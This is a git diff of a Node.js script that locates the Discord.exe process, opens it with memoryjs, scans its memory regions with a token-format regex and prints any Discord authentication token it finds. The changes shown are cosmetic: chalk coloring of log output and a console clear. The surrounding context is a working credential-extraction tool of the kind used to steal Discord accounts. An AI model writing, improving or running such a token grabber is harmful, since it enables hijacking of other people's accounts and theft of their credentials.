@@ -1,4 +1,5 @@
 const memoryjs = require("memoryjs");
+const chalk = require("chalk");
 
 // Variables
 let token = "";
@@ -15,6 +16,9 @@ let secondCheck = new RegExp(/[a-zA-Z0-9]{26}\.[a-zA-Z0-9-_]{6}\.[a-zA-Z0-9-_]{3
 let procID = 0;
 let found = false;
 
+// Clear console
+console.clear();
+
 // For loop to search for Discord.exe
 for (let i = 0; i < processes.length; i++) {
 
@@ -25,7 +29,7 @@ for (let i = 0; i < processes.length; i++) {
         if (found == false) {
 
             // When we find Discord save it to variable and set found to true
-            console.log(`succesfully found ${processes[i].szExeFile} with pID ${processes[i].th32ProcessID}`);
+            console.log(`succesfully found ${chalk.yellow(processes[i].szExeFile)} with pID ${chalk.cyan(processes[i].th32ProcessID)}`);
             procID = processes[i].th32ProcessID;
             found = true;
         };
@@ -34,14 +38,14 @@ for (let i = 0; i < processes.length; i++) {
 
 // If we couldn't find Discord
 if (found == false) {
-    console.log(`could not find ${processName}`);
+    console.log(`could not find ${chalk.yellow(processName)}`);
 } else {
     console.log("getting process handle and base address...");
 
     // Open the process to get the handle and base address
     const processObject = memoryjs.openProcess(procID);
 
-    console.log(`succesfully retrieved handle ${processObject.handle} and base address ${processObject.modBaseAddr}`);
+    console.log(`succesfully retrieved handle ${chalk.cyan(processObject.handle)} and base address ${chalk.cyan(processObject.modBaseAddr)}`);
     console.log("searching token in memory...");
 
     // Start timer
@@ -83,17 +87,17 @@ if (found == false) {
             // Update the address each loop
             addr = query.BaseAddress + query.RegionSize;
         } catch (err) {
-            return console.log("could not find token in memory because of the following " + err);
+            return console.log("could not find token in memory because of the following " + chalk.red(err));
         };
     };
 
     // Check if we could find the token
     if (token.length == 0) {
-        console.log("could not find token in memory");
+        console.log(chalk.red("could not find token in memory"));
     } else {
 
         // Log the token and stop the timer
-        console.log("token: " + token);
+        console.log("token: " + chalk.greenBright(token));
         console.timeEnd("Found token in");
     };
 };
